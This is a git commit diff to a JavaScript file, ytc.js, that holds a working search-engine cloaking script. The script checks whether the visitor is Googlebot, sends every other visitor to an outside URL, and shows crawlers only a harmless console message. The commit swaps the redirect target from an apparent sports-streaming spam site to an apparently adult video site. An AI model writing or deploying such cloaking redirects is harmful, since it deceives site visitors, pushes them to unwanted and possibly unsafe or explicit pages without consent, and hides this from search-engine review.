dabafedaeb92be9bdd76b33f3fab59bfb4d42291
mdsojibislams <mdsojibislams620@gmail.com>
2026-09-18 02:46:00 +0600

    Change redirect URL for non-crawler users

--- ytc.js
+++ ytc.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://sdhsaatv.pro/psl/?m=Watch Orlando Pirates vs Durban City";
+  window.location.href = "https://videonsfw.com/vod/?Ask";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
